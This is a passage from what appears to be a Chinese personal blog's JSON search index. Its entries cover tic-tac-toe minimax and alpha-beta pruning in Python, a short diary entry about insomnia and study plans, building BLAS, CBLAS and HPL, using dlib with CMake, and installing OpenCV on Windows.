=225\\)\u683c\uff0c\u5982\u679c\u91c7\u7528\u4e0a\u8ff0\u7b97\u6cd5\uff0c\u8fd9\u4e2a\u6811\u6700\u591a\u4f1a\u6709: $$     225! \\approx 10^{430} (n! \\approx \\sqrt{2\\pi n}\\left (\\frac{n}{e} \\right )^n) $$ \u8fd9\u4e2a\u6570\u91cf\u7ea7\u7684\u8fb9\u6216\u8005\u8282\u70b9\u3002</p> <p>\u4f5c\u4e3a\u5bf9\u6bd4\uff0c\u5b87\u5b99\u539f\u5b50\u603b\u6570\u4e0d\u8d85\u8fc7\\(10^{100}\\)\uff0c\u800c\u76ee\u524d\u8d85\u7ea7\u8ba1\u7b97\u673a\u7684\u8ba1\u7b97\u80fd\u529b\u8fd8\u672a\u8fbe\u5230EFLOPS\u6570\u91cf\u7ea7\uff0c\u5373\u6bcf\u79d2\u8fdb\u884c\\(10^{18}\\)\u6b21\u6d6e\u70b9\u8fd0\u7b97\u3002\u53ef\u4ee5\u60f3\u8c61\uff0c\u4e0a\u9762\u7684\u6570\u91cf\u7ea7\u662f\u591a\u4e48\u9065\u4e0d\u53ef\u53ca\u7684\u5b58\u5728\u3002</p> <p>\u4e0d\u8fc7\u5e78\u597d\uff0c\u4e95\u5b57\u68cb\u7684\u53ef\u80fd\u6027\u53ea\u6709\\(9! = 362880\\)\uff0c\u91c7\u7528\u4e0a\u9762\u7684\u7b97\u6cd5\u662f\u5b8c\u5168\u53ef\u884c\u7684\u3002\u6587\u672b\u9644\u4ee3\u7801\u3002</p>","tags":["\u4e95\u5b57\u68cb","\u526a\u679d"]},{"location":"%E5%8D%9A%E5%AE%A2/2020/02/11/2020-02-11-%E4%BA%95%E5%AD%97%E6%A3%8B%E4%B8%8E%E6%9C%80%E5%A4%A7%E6%9C%80%E5%B0%8F%E5%80%BC%E7%AE%97%E6%B3%95/#alpha-beta\u526a\u679d\u7b97\u6cd5","title":"alpha-beta\u526a\u679d\u7b97\u6cd5","text":"<p>\u4e0a\u9762\u7684\u7b97\u6cd5\u76f4\u63a5\u751f\u6210\u5b8c\u6574\u7684\u6811\uff0c\u7136\u540e\u518d\u5b8c\u6574\u904d\u5386\u4ec5\u7528\u4e8e\u8bf4\u660e\u539f\u7406\u3002\u4e8b\u5b9e\u4e0a\u6211\u4eec\u53ef\u4ee5\u5f15\u8fdb\u4e00\u4e2aLevel\u53d8\u91cf\uff0c\u7528\u4e8e\u63a7\u5236\u8ba1\u7b97\u673a\u7684\u201c\u806a\u660e\u201d\u7a0b\u5ea6\u3002\u4ee5\u4e0b\u662f\u4e0d\u540c\u7684\u5730\u65b9\uff1a 1. \u6811\u4e0d\u5fc5\u63d0\u524d\u751f\u6210\uff0c\u800c\u5728\u5728\u8fdb\u884c\u51b3\u7b56\u7684\u65f6\u5019\u624d\u5f80\u4e0b\u751f\u957fLevel\u5c42\u3002\uff08\u51cf\u5c11\u5185\u5b58\u5f00\u9500\uff09 2. \u9700\u8981\u5f15\u5165\u8bc4\u5206\u51fd\u6570\uff0c\u5408\u7406\u5730\u5bf9\u5404\u4e2a\u201c\u5f62\u52bf\u201d\u8fdb\u884c\u8bc4\u5206\u3002\u4e4b\u524d\u53ea\u5bf9\u80dc\u8d1f\u5e73\u4e09\u79cd\u60c5\u51b5\u8fdb\u884c\u4e86\u8bc4\u5206\u3002 3. alpha-beta\u526a\u679d\u7b97\u6cd5\u8fdb\u884c\u641c\u7d22\u3002\u4e0d\u5fc5\u81ea\u5e95\u5411\u4e0a\u5b8c\u6574\u904d\u5386\u751f\u6210\u7684\u6811\u3002</p> <p>\u53c2\u8003\u8d44\u6599\uff1aalpha-beta\u526a\u679d\u7b97\u6cd5-\u52a0\u5229\u798f\u5c3c\u4e9a\u5927\u5b66\u6d1b\u6749\u77f6\u5206\u6821</p>","tags":["\u4e95\u5b57\u68cb","\u526a\u679d"]},{"location":"%E5%8D%9A%E5%AE%A2/2020/02/11/2020-02-11-%E4%BA%95%E5%AD%97%E6%A3%8B%E4%B8%8E%E6%9C%80%E5%A4%A7%E6%9C%80%E5%B0%8F%E5%80%BC%E7%AE%97%E6%B3%95/#\u4e95\u5b57\u68cbpython\u4ee3\u7801","title":"\u4e95\u5b57\u68cbpython\u4ee3\u7801","text":"<p>\u5b8c\u6574\u4ee3\u7801\u4e0b\u8f7d:TicTacToe.py</p> <p>\u5173\u952e\u4ee3\u7801\uff1a</p> <pre><code>def gen_game_tree(board, choices, player):\n    '''\n    generate the all possibility game tree when the specific player play the first within the given board and choices\n    the leaf node value is the result related to the specific player: player-&gt; win, -player-&gt; lose, 0 tie\n\n    board: list, numerical board\n    choices: list, the possible move index\n    player: int, -1 or 1(not the char 'X' or 'O')\n\n    return: dict, the game tree, like {1:{...}, 2:-1, ...}\n    '''\n    if len(choices)==0:\n        return 0    # no winner\n    #DSF\n    tree = {} \n    for i in range(len(choices)):\n        #make copy\n        choices_next = choices[:]\n        board_next = board[:]\n\n        del choices_next[i]\n        makeMove(board_next, player, choices[i])\n        if isWinner(board_next, player):\n            tree[choices[i]]= player\n        else:\n            tree[choices[i]]=gen_game_tree(board_next, choices_next, -player)\n    return tree\n\ndef maxminmize(tree, isMAX):\n    '''\n    Search the tree and generate the internal-node value. since there is no Level restriction, the\n    computer will search the whole tree. So you will never win the computer in this game!!!\n\n    isMAX: bool, whether is the MAX layer. MAX mean the first player, need to maximize his value.\n           MIN mean the latter player, need to minimize the first player value.\n    '''\n    if type(tree)==int:\n        return tree\n\n    if isMAX:\n        the_max = -2 # negative infinite (compare to -1, 0, 1)\n        for move, subtree in tree.items():\n            value = maxminmize(subtree, not isMAX)\n            if value &gt; the_max:\n                the_max = value\n                the_move = move\n        tree[0]=[the_move, the_max] #since 0 is not in 1~9, use it to record the max or min value.\n    else:\n        the_min = 2 # infinite (compare to -1, 0, 1)\n        for move, subtree in tree.items():\n            value = maxminmize(subtree, not isMAX)\n            if value &lt; the_min:\n                the_min = value\n                the_move = move\n        tree[0]=[the_move, the_min] #since 0 is not in 1~9, use it to record the max or min value.\n    return tree[0][1]\n</code></pre>","tags":["\u4e95\u5b57\u68cb","\u526a\u679d"]},{"location":"%E4%B8%AA%E4%BA%BA/2020/02/14/2020-02-14-%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E5%A4%B1%E7%9C%A0/","title":"\u8bb0\u5f55\u4e00\u6b21\u5931\u7720","text":"<p>\u4eca\u5929\u67e5\u4e86\u4e00\u4e9b\u5173\u4e8e\u4fdd\u7814\u7684\u4e8b\uff0c \u665a\u4e0a\u6709\u70b9\u5931\u7720\u3002 \u6211\u56de\u987e\u4e86\u4ee5\u5f80\u7684\u4e8b\uff0c \u6709\u521d\u4e2d\u8fd8\u6709\u9ad8\u4e2d\u3002</p> <p>\u6211\u56de\u5fc6\u8d77\u90a3\u65f6\u81ea\u5df1\u662f\u600e\u6837\u7684\u6a21\u6837\uff0c \u6211\u611f\u6168\u6709\u4e9b\u4e8b\u4e0d\u8bb0\u5f55\u4e5f\u8bb8\u5c31\u771f\u7684\u5fd8\u4e86\u3002 \u6211\u660e\u767d\u5982\u679c\u4e0d\u7ecf\u5e38\u773a\u671b\u4e00\u4e0b\u8fdc\u65b9\uff0c \u800c\u53ea\u662f\u4f4e\u5934\u770b\u7740\u73b0\u5728\uff0c \u65f6\u95f4\u4e5f\u8bb8\u7728\u773c\u5c31\u8fc7\u53bb\u4e86\u3002</p> <p>\u8981\u5bf9\u77ed\u671f\u7684\u672a\u6765\u6709\u6240\u8ba1\u5212\uff0c \u8ba1\u5212\u4e0d\u662f\u4e00\u4e2a\u4e25\u683c\u7684\u65e5\u7a0b\u8868\uff0c \u8ba9\u81ea\u5df1\u5931\u53bb\u81ea\u7531\uff0c \u800c\u662f\u660e\u767d\u4f60\u6700\u8fd1\u6700\u60f3\u505a\u4ec0\u4e48\uff0c \u4f60\u73b0\u5728\u60f3\u505a\u4ec0\u4e48\u3002</p> <p>\u6211\u60f3\u8981: 1 \u6211\u60f3\u8981\u7ec3\u4e60\u53e3\u8bed\uff0c\u4e3a\u590f\u4ee4\u8425\u7684\u82f1\u8bed\u81ea\u6211\u4ecb\u7ecd\u505a\u51c6\u5907 2 \u6211\u60f3\u8981\u8054\u7cfb\u4e00\u4e9b\u540c\u5b66\uff0c\u548c\u4ed6\u4eec\u804a\u804a\u672a\u6765\u3002\u5fc5\u5b9a\u6709\u6240\u6536\u83b7\u3002 3 \u6211\u60f3\u6709\u4e00\u4e2a\u7231\u597d\uff0c\u5982\u5b66\u4f1a\u57fa\u7840\u7684\u65e5\u8bed\u3002 4 \u6211\u60f3\u5728\u7f16\u7a0b\u80fd\u529b\uff08\u6570\u636e\u7ed3\u6784\u548c\u7b97\u6cd5\uff09\u4e0a\u6709\u6240\u63d0\u9ad8\u3002</p> <p>\u6211\u53d1\u73b0\u5217\u51fa\u613f\u671b\u80fd\u8ba9\u81ea\u5df1\u66f4\u52a0\u660e\u786e\u65b9\u5411\u3002</p>","tags":["\u4fdd\u7814"]},{"location":"%E5%AD%A6%E4%B9%A0/2020/02/16/2020-02-16-HPL-complie/","title":"\u8fd0\u884cHPL","text":"","tags":["hpl"]},{"location":"%E5%AD%A6%E4%B9%A0/2020/02/16/2020-02-16-HPL-complie/#\u7f16\u8bd1blascblas","title":"\u7f16\u8bd1BLAS/CBLAS","text":"<p>BLAS\u4e3afortran\u63a5\u53e3\u7684\u5e93\uff0cCBLAS\u4e3aC\u8bed\u8a00\u63a5\u53e3\u7684\u5e93</p> <pre><code> tar zxf blas-3.8.0.tgz \n tar zxf cblas.tgz\n cd BLAS-3.8.0\n make #\u751f\u6210blas_LINUX.a\n cp blas_LINUX.a ../CBLAS\n cd ../CBLAS\n vi Makefile.in\n #\u4fee\u6539\n # BLLIB = ../blas_LINUX.a\n make #\u5728lib/\u4e0b\u751f\u6210cblas_LINUX.a\n</code></pre>","tags":["hpl"]},{"location":"%E5%AD%A6%E4%B9%A0/2020/02/16/2020-02-16-HPL-complie/#\u7f16\u8bd1hpl","title":"\u7f16\u8bd1HPL","text":"<pre><code>tar zxf hpl-2.3.tar.gz \ncd hpl-2.3\ncp setup/Make.Linux_PII_CBLAS ./Make.&lt;arch&gt; #\u5728top-level \u6587\u4ef6\u5939\u4e0b\nvi Make.&lt;arch&gt; #\u4fee\u6539\nmake &lt;arch&gt; #\u5728bin/&lt;arch&gt;/\u4e0b\u751f\u6210HPL.dat xhpl\n</code></pre>","tags":["hpl"]},{"location":"%E5%AD%A6%E4%B9%A0/2020/02/16/2020-02-16-HPL-complie/#make\u793a\u4f8b","title":"Make.\u793a\u4f8b","text":"","tags":["hpl"]},{"location":"%E5%AD%A6%E4%B9%A0/2020/02/16/2020-02-16-HPL-complie/#openmpicblas","title":"OpenMPI+CBLAS","text":"<pre><code>ARCH         = &lt;arch&gt;\n\nTOPdir       = /home/mpiuser/hpl-2.3\n\nMPdir        = /path/to/OpenMPI\nMPinc        = -I$(MPdir)/include\nMPlib        = $(MPdir)/lib/libmpi.so\n\nLAdir        = \nLAinc        = \nLAlib        = path/to/cblas_LINUX.a path/to/blas_LINUX.a #\u987a\u5e8f\u4e0d\u80fd\u6539\u53d8\uff0ccblas\u4f9d\u8d56blas\n\nHPL_OPTS     = -DHPL_CALL_CBLAS \n\nCC           = mpicc\nLINKER       = mpif77\n</code></pre>","tags":["hpl"]},{"location":"%E5%AD%A6%E4%B9%A0/2020/02/16/2020-02-16-HPL-complie/#hpl\u4f18\u5316","title":"HPL\u4f18\u5316","text":"","tags":["hpl"]},{"location":"%E5%AD%A6%E4%B9%A0/2020/02/16/2020-02-16-HPL-complie/#\u914d\u7f6e\u53c2\u6570","title":"\u914d\u7f6e\u53c2\u6570 <p>\u8ba1\u7b97\u6b21\u6570\uff1a</p> \\[ \\#Ns \\times \\#NBs \\times \\#(Ps, Qs) \\times \\#PFACTs \\times \\#NBMINs \\times \\#BCASTs \\times \\#DEPTHs \\] <pre><code>HPLinpack benchmark input file\nInnovative Computing Laboratory, University of Tennessee\nHPL.out      output file name (if any)\n6            device out (6=stdout,7=stderr,file)\n1            # of problems sizes (N)\n8192         Ns\n1            # of NBs\n128          NBs\n0            PMAP process mapping (0=Row-,1=Column-major)\n3            # of process grids (P x Q)\n2 1 4        Ps\n2 4 1        Qs\n16.0         threshold\n3            # of panel fact\n0 1 2        PFACTs (0=left, 1=Crout, 2=Right)\n2            # of recursive stopping criterium\n2 4          NBMINs (&gt;= 1)\n2            # of panels in recursion\n2            NDIVs\n3            # of recursive panel fact.\n0 1 2        RFACTs (0=left, 1=Crout, 2=Right)\n1            # of broadcast\n0            BCASTs (0=1rg,1=1rM,2=2rg,3=2rM,4=Lng,5=LnM)\n1            # of lookahead depth\n0            DEPTHs (&gt;=0)\n2            SWAP (0=bin-exch,1=long,2=mix)\n64           swapping threshold\n0            L1 in (0=transposed,1=no-transposed) form\n0            U  in (0=transposed,1=no-transposed) form\n1            Equilibration (0=no,1=yes)\n8            memory alignment in double (&gt; 0)\n</code></pre>","text":"","tags":["hpl"]},{"location":"%E5%AD%A6%E4%B9%A0/2020/03/01/2020-02-29-use-dlib-in-c%2B%2B/","title":"Use dlib in C++","text":"","tags":["dlib","cpp"]},{"location":"%E5%AD%A6%E4%B9%A0/2020/03/01/2020-02-29-use-dlib-in-c%2B%2B/#use-dlib-in-c","title":"use dlib in c++","text":"<p>\u4ece\u65b9\u6cd51.1\u52301.3\u90fd\u4e0d\u5fc5\u9884\u7f16\u8bd1dlib\u5e93\uff0c\u800c\u662f\u5728\u4f7f\u7528dlib\u7684\u9879\u76ee\u4e2d\u7f16\u8bd1\u3002</p> <p>\u65b9\u6cd51.4\u4ecb\u7ecd\u4e86\u5c06dlib\u9884\u7f16\u8bd1\u6210\u9759\u6001\u5e93\u7136\u540e\u4f7f\u7528\u65f6\u4f1a\u9047\u5230\u7684\u4e00\u4e9b\u95ee\u9898\u3002</p>","tags":["dlib","cpp"]},{"location":"%E5%AD%A6%E4%B9%A0/2020/03/01/2020-02-29-use-dlib-in-c%2B%2B/#with-cmakeofficially-recommend","title":"with CMake(officially recommend)","text":"<p>\u770b<code>dlib/example/CMakeLists.txt</code></p> <pre><code>cmake_minimum_required(VERSION 2.8.12)\n\nproject(examples)\n\n# Tell cmake we will need dlib.  This command will pull in dlib and compile it\n# into your project.  Note that you don't need to compile or install dlib.  All\n# cmake needs is the dlib source code folder and it will take care of everything.\nadd_subdirectory(./dlib dlib_build)\n\nmacro(add_example name)\n   add_executable(${name} ${name}.cpp)\n   target_link_libraries(${name} dlib::dlib )\nendmacro()\n\n# if an example requires GUI, call this macro to check DLIB_NO_GUI_SUPPORT to include or exclude\nmacro(add_gui_example name)\n   if (DLIB_NO_GUI_SUPPORT)\n      message(\"No GUI support, so we won't build the ${name} example.\")\n   else()\n      add_example(${name})\n   endif()\nendmacro()\n\n# \nadd_gui_example(3d_point_cloud_ex)\n</code></pre> <p>\u547d\u4ee4\u884c\u6267\u884c\uff1a</p> <pre><code>mkdir build\ncd build\ncmake .. -G \"Visual Studio 14 2015 Win64\" -T host=x64 #-T host=x64\u544a\u8bc9CMake\u751f\u621064bit\u7684\u53ef\u6267\u884c\u6587\u4ef6\u3002\u5176\u5b9e\u5b89\u88c5\u4e86\u6700\u65b0\u7684VisualStudio\u540e\uff0c-G -T\u90fd\u4e0d\u7528\u6307\u5b9a\uff0c\u9ed8\u8ba4\u4f7f\u7528\u6700\u65b0\u7684VisualStudio\uff0c\u9ed8\u8ba464\u4f4d\u3002\ncmake --build . --config Release\n</code></pre> <p>\u4f7f\u7528CMake GUI\u53ef\u4ee5\u8bbe\u7f6e\u4e00\u4e9b\u9009\u9879\uff0cconfigure, generate\u4e4b\u540e\u53ef\u4ee5\u4f7f\u7528\u547d\u4ee4\u884c\u6267\u884c\u6700\u540e\u4e00\u6b65(\u4e0d\u7528\u6253\u5f00VisualStudio)</p>","tags":["dlib","cpp"]},{"location":"%E5%AD%A6%E4%B9%A0/2020/03/01/2020-02-29-use-dlib-in-c%2B%2B/#with-gcc-in-terminal","title":"with GCC in terminal","text":"<pre><code>g++ -std=c++11 -O3 -I.. ../dlib/all/source.cpp -lpthread -lX11 example_program_name.cpp\n</code></pre> <p>windows\u4e0b\u8fd8\u9700<code>gdi32, comctl32, user32, winmm, ws2_32, or imm32</code>\u5e93</p>","tags":["dlib","cpp"]},{"location":"%E5%AD%A6%E4%B9%A0/2020/03/01/2020-02-29-use-dlib-in-c%2B%2B/#with-visualstudio","title":"with VisualStudio","text":"<ul> <li>\u628adlib\u7684\u7236\u76ee\u5f55\u6dfb\u52a0\u5230include search path</li> </ul> <p>You should NOT add the dlib folder itself to your compiler's include path.    Doing so will cause the build to fail because of name collisions (such as    dlib/string.h and string.h from the standard library). Instead you should    add the folder that contains the dlib folder to your include search path    and then use include statements of the form #include  or   #include \"dlib/queue.h\".  This will ensure that everything builds correctly. <ul> <li>\u628a dlib/all/source.cpp \u6dfb\u52a0\u5230\u6e90\u6587\u4ef6</li> </ul> <p>If you are using Visual Studio you add .cpp files to your application using   the solution explorer window.  Specifically, right click on Source Files,   then select Add -&gt; Existing Item and select the .cpp files you want to add.</p> <ul> <li>\u5982\u679c\u9700\u8981libjpeg\u7b49\uff0c\u628adlib/external\u6587\u4ef6\u5939\u4e0b\u7684\u6e90\u6587\u4ef6\u6dfb\u52a0\u5230project\uff0c\u5e76 define the DLIB_PNG_SUPPORT and DLIB_JPEG_SUPPORT preprocessor directives. </li> </ul>","tags":["dlib","cpp"]},{"location":"%E5%AD%A6%E4%B9%A0/2020/03/01/2020-02-29-use-dlib-in-c%2B%2B/#installing-dlib-as-a-precompiled-library","title":"Installing dlib as a precompiled library","text":"<p>dlib\u7684CMake\u811a\u672c\u5305\u542bINSTALL target\uff0c\u56e0\u6b64\u53ef\u4ee5\u50cf\u5176\u5b83C++\u5e93\u4e00\u6837\u5c06dlib\u4f5c\u4e3a\u4e00\u4e2a\u9759\u6001\u6216\u52a8\u6001\u5e93\u5b89\u88c5\u5230\u7cfb\u7edf\u4e0a\u3002</p> <ul> <li>\u4f7f\u7528\u9884\u7f16\u8bd1\u7684\u5e93\u65f6\uff0c\u5fc5\u987b\u4fdd\u8bc1\u9879\u76ee\u4e2d\u4f7f\u7528\u7684\u6240\u6709\u5e93\u90fd\u662f\u540c\u4e00\u4e2a\u7248\u672c\u7684VisualStudio\u7f16\u8bd1\u51fa\u6765\u7684\u3002</li> </ul> <p>\u8bf4\u660e\uff1aMixing Multiple Visual Studio Versions in a Program is Evil</p> <ul> <li>\u8c03\u7528dlib\u65f6\u51fa\u73b0USER_ERROR inconsistent_build_configuration see_dlib_faq_2\u9519\u8bef\u3002   \u9700\u8981\u5c06build/dlib/config.h\u6587\u4ef6\u62f7\u8d1d\u5230\u6e90\u7801\u76ee\u5f55dlib-19.17/dlib\u8fdb\u884c\u8986\u76d6\u3002config.h\u6587\u4ef6\u5185\u6709\u5176\u8bf4\u660e\u3002</li> </ul>","tags":["dlib","cpp"]},{"location":"%E5%AD%A6%E4%B9%A0/2020/03/01/2020-02-29-use-dlib-in-c%2B%2B/#\u914d\u7f6e3d_face_reconstruction\u603b\u7ed3","title":"\u914d\u7f6e3d_face_reconstruction\u603b\u7ed3","text":"","tags":["dlib","cpp"]},{"location":"%E5%AD%A6%E4%B9%A0/2020/03/01/2020-02-29-use-dlib-in-c%2B%2B/#1-opencv","title":"1. OpenCV","text":"<ol> <li> <p>windows\u4e0b\u8f7d\u9884\u7f16\u8bd1\u7248(\u53ea\u542b\u6709msvc\u7f16\u8bd1\u7684\u7248\u672c)</p> </li> <li> <p>CMake\u76f4\u63a5\u4f7f\u7528find_packages\u5373\u53ef\u3002\uff08\u9700\u6dfb\u52a0\u73af\u5883\u53d8\u91cf\uff0c\u4ee5\u4fbf\u627e\u5230OpenCV\u7684config\u6587\u4ef6\uff09</p> </li> </ol>","tags":["dlib","cpp"]},{"location":"%E5%AD%A6%E4%B9%A0/2020/03/01/2020-02-29-use-dlib-in-c%2B%2B/#2-dlib","title":"2. dlib","text":"<ol> <li>\u5b98\u65b9\u63a8\u8350\u5c06\u4ee3\u7801\u76f4\u63a5\u5305\u542b\u5230\u9879\u76ee\u4e2d\u7f16\u8bd1\uff08\u597d\u5904\u662f\u6ca1\u6709ABI\u4e00\u81f4\u6027\u95ee\u9898\uff09</li> </ol> <p>CMake\u4e2dadd_subdirectory(/path/to/dlib/top/dir)\u5373\u53ef\u3002\uff08\u751a\u81f3\u53ef\u4ee5\u81ea\u52a8\u4ece\u7f51\u4e0a\u4e0b\u8f7d\uff09</p>","tags":["dlib","cpp"]},{"location":"%E5%AD%A6%E4%B9%A0/2020/03/01/2020-02-29-use-dlib-in-c%2B%2B/#3-boost","title":"3. boost","text":"<ol> <li>\u5206\u4e3a\u53ea\u542b\u6709\u5934\u6587\u4ef6\u7684\u5e93\u548c\u9700\u8981\u72ec\u7acb\u7f16\u8bd1\u7684\u5e93\u3002</li> <li>\u5b98\u65b9\u7f16\u8bd1\u65b9\u6cd5\u4e3a\uff1a</li> <li>\u5148build\u51faBoost.Build\uff08\u53ef\u4ee5\u770b\u4f5cBoost\u7684\u4e00\u4e2abuild\u5de5\u5177\uff09</li> <li>\u7136\u540e\u8c03\u7528b2\u7f16\u8bd1\u6307\u5b9a\u6a21\u5757\u3002\uff08\u53ef\u4ee5\u6dfb\u52a0\u53c2\u6570\u6307\u5b9a\u7f16\u8bd1\u7684\u5e93\u7684\u8def\u5f84\uff09</li> <li>\u6211\u7684\u7f16\u8bd1\u76ee\u5f55\u662fstage/\uff08\u5e93\u4f4d\u4e8estage/lib/\u4e0b\uff09</li> <li>CMake find_packages\u6682\u65f6\u662f\u5931\u8d25\u7684\u3002</li> </ol>","tags":["dlib","cpp"]},{"location":"%E5%AD%A6%E4%B9%A0/2020/03/01/2020-02-29-use-dlib-in-c%2B%2B/#4-eos","title":"4. eos","text":"<ol> <li>\u53ea\u9700\u8981\u5305\u542b\u5934\u6587\u4ef6\u5373\u53ef(header only)\uff0cinclude\u548c3rdparty</li> <li>\u9876\u5c42\u76ee\u5f55\u4e0b\u7684CMakeLists.txt\u9ed8\u8ba4\u52fe\u9009\u4e86\u7f16\u8bd1example\u4e0b\u7684\u793a\u4f8b\uff08\u9700\u8981boost\u7684system, filesystem, program_options\u548copenCV\u7684core, higui, imgproc</li> <li>CMake\u76f4\u63a5add_subdirectory(/path/to/eos)\u6bd4\u8f83\u65b9\u4fbf\u3002</li> </ol>","tags":["dlib","cpp"]},{"location":"%E5%AD%A6%E4%B9%A0/2020/03/01/2020-02-29-use-dlib-in-c%2B%2B/#5-qt","title":"5. Qt","text":"<ol> <li>\u5b98\u65b9\u4ecb\u7ecd\u4e86\u5982\u4f55\u4f7f\u7528CMake find_packages\uff0c\u81ea\u52a8tic, moc\u7b49\u3002</li> </ol>","tags":["dlib","cpp"]},{"location":"%E5%AD%A6%E4%B9%A0/2020/03/01/2020-02-29-use-dlib-in-c%2B%2B/#todo","title":"TODO","text":"<ol> <li>\u5b66\u4e60Qt\uff0c\u80fd\u81ea\u5df1\u5199\u754c\u9762\u3002</li> <li>\u660e\u767deos\u90a3\u4e2a\u793a\u4f8b\u7a0b\u5e8f\u8f93\u5165\u8f93\u51fa\u662f\u4ec0\u4e48</li> <li>\u6700\u540e\uff0c\u81ea\u5df1\u6765\u6539\u5199eos\u7684\u7a0b\u5e8f\uff0c\u81ea\u5df1\u5199Qt\u7a0b\u5e8f\uff0c\u6700\u540e\u5c55\u793a\u51fa\u6765\u3002</li> </ol>","tags":["dlib","cpp"]},{"location":"%E5%AD%A6%E4%B9%A0/2020/02/29/2020-02-29-%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8OpenCV%28windows%29/","title":"\u5b89\u88c5\u4f7f\u7528OpenCV(windows)","text":"","tags":["opencv"]},{"location":"%E5%AD%A6%E4%B9%A0/2020/02/29/2020-02-29-%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8OpenCV%28windows%29/#install","title":"Install","text":"","tags":["opencv"]},{"location":"%E5%AD%A6%E4%B9%A0/2020/02/29/2020-02-29-%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8OpenCV%28windows%29/#\u5b89\u88c5\u9884\u7f16\u8bd1\u7248","title":"\u5b89\u88c5\u9884\u7f16\u8bd1\u7248","text":"<p>\u5728opencv.org\u4e0a\u63d0\u4f9b\u4e86\u6e90\u4ee3\u7801\u4ee5\u53ca\u5404\u4e2a\u64cd\u4f5c\u7cfb\u7edf\u7684\u9884\u7f16\u8bd1\u7248\u3002windows\u9884\u7f16\u8bd1\u7248\u4e3a\u4e00\u4e2ainstaller\u7a0b\u5e8f\uff0c\u8fd0\u884c\u540e\u4f1a\u5c06\u5404\u79cd\u6587\u4ef6extract\u5230\u5b89\u88c5\u76ee\u5f55\u3002\u5b89\u88c5\u5b8c\u6210\u540e\uff0c<code>/path/to/opencv/</code>\u5305\u542b\u4e24\u4e2a\u76ee\u5f55\u2014\u2014build, source\u3002source\u4e3a\u6e90\u4ee3\u7801\u76ee\u5f55(\u548c\u76f4\u63a5\u4e0b\u8f7d\u6e90\u4ee3\u7801\u89e3\u538b\u4e00\u6a21\u4e00\u6837)\uff0cbuild\u4e0b\u5305\u542b\u4e86\u8bb8\u591a\u5176\u5b83\u6587\u4ef6\u3002\u5176\u4e2d:</p> <ul> <li> <p>include/\u4e3a\u8c03\u7528OpenCV\u65f6\u9700\u8981\u5305\u542b\u7684\u5934\u6587\u4ef6(\u6e90\u4ee3\u7801\u76ee\u5f55\u4e0b\u4e5f\u6709)</p> </li> <li> <p>x64/vcxx/\u4e0b\u5305\u542bbin/\u548clib/\uff0c\u4e3a\u9884\u7f16\u8bd1\u7684\u5e93\u3002vcxx\u4ee3\u8868\u4f7f\u7528MSVC xx\u7f16\u8bd1\u7684\uff0c\u8fd0\u884c\u65f6\u9700\u8981\u5bf9\u5e94\u7684runtime\u5e93\u3002</p> </li> </ul> IDE \u7f16\u8bd1\u5668 VS2017 VC15 VS2015 VC14 VS2013 VC12 VS2012 VC11 VS2010 VC10 VS2008 VC9 VS2005 VC8 <ul> <li> <p>etc/\u6587\u4ef6\u5939\u4e2d\u662fOpenCV\u67d0\u4e9b\u7b97\u6cd5\u6240\u4f9d\u8d56\u7684\u6570\u636e\u96c6\u3002</p> </li> <li> <p><code>OpenCVConfig.cmake</code>\u6587\u4ef6\u5728\u4f7f\u7528CMake\u7f16\u8bd1\u9879\u76ee\u65f6\u53ef\u4f7f\u7528find_package\u81ea\u52a8\u641c\u7d22\u5934\u6587\u4ef6\u3001\u5e93\u6587\u4ef6\u8def\u5f84</p> </li> <li> <p>\u5176\u5b83\u6587\u4ef6\u6682\u65f6\u4e0d\u7ba1</p> </li> </ul>","tags":["opencv"]},{"location":"%E5%AD%A6%E4%B9%A0/2020/02/29/2020-02-29-%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8OpenCV%28windows%29/#\u4ece\u6e90\u6587\u4ef6\u7f16\u8bd1opencv","title":"\u4ece\u6e90\u6587\u4ef6\u7f16\u8bd1OpenCV","text":"<p>\u7565</p>","tags":["opencv"]},{"location":"%E5%AD%A6%E4%B9%A0/2020/02/29/2020-02-29-%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8OpenCV%28windows%29/#usage","title":"Usage","text":"","tags":["opencv"]},{"location":"%E5%AD%A6%E4%B9%A0/2020/02/29/2020-02-29-%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8OpenCV%28windows%29/#\u901a\u8fc7visualstudio\u7f16\u8bd1opencv\u7a0b\u5e8f","title":"\u901a\u8fc7VisualStudio\u7f16\u8bd1OpenCV\u7a0b\u5e8f","text":"<ol> <li> <p>\u83dc\u5355\u680fproject-&gt;properities\u3002\uff08\u6216\u5728\u53f3\u4fa7\u7684Solution Explorer\u4e0b\u627e\u5230\u4e00\u4e2aproject(solution\u548cproject\u7684\u5173\u7cfb)\u3002\u9f20\u6807\u53f3\u952e-&gt;Properities\uff09</p> </li> <li> <p>C/C++/AdditionalIncludeDirectories\u3002\u7f16\u8bd1\u5668\u4ece\u8be5\u6587\u4ef6\u5939\u4e0b\u67e5\u627e\u5934\u6587\u4ef6\u3002</p> </li> </ol> <p>(p.s. <code>#include \"opencv2/opencv.hpp\"</code>\u548c<code>#include \"opencv.hpp\"</code>\u5bf9\u5e94\u4e0d\u540c\u7684\u8bbe\u7f6e)</p> <ol> <li> <p>Linker/Input/AdditionalDependencies \u6dfb\u52a0<code>opencv_world420.lib</code></p> </li> <li> <p>Linker/General/AdditionalLibraryDirectories \u6dfb\u52a0<code>opencv_world420.lib</code>\u6240\u5728\u76ee\u5f55\u3002\uff08\u6216\u76f4\u63a5\u57283\u4e2d\u8f93\u5165\u7edd\u5bf9\u8def\u5f84\uff09</p> </li> <li> <p>\u8bbe\u7f6e\u73af\u5883\u53d8\u91cf\uff0c\u628a<code>opencv_world420.dll</code>\u6240\u5728\u76ee\u5f55\u6dfb\u52a0\u5230Path\u53d8\u91cf\u3002(\u5426\u5219\u8fd0\u884c\u65f6\u62a5\u9519: \u65e0\u6cd5\u627e\u5230<code>opencv_world420.dll</code>)\u3002\u4e0d\u6dfb\u52a0\u73af\u5883\u53d8\u91cf\u7684\u65b9\u6cd5\u662f\u76f4\u63a5\u628a<code>opencv_world420.dll</code>\u62f7\u8d1d\u5230exe\u6240\u5728\u76ee\u5f55\u3002</p> </li> </ol> <p>p.s. 